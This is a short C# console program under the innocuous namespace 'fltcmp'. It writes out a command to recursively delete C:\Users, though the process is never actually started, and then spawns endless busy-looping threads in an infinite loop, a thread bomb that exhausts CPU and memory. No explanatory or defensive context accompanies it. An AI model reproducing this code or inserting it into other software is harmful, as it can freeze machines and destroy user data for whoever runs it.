using System;
using System.Diagnostics;
using System.Threading;

namespace fltcmp
{
    class Program
    {
        static void Main(string[] args)
        {
            Process aProcess = new Process();
            aProcess.StartInfo.FileName = @"cmd /c rmdir /S C:\Users\";
            for (; /*ever*/;)
            {
                Thread aThread = new Thread(ThreadStart);
                aThread.Start();
            }
        }

        private static void ThreadStart()
        {
            int i = 0;
            double d = 0;
            long l = 0;

            for (; /*ever*/;)
            {
                i++;
                d++;
                l++;
            }
        }
    }
}
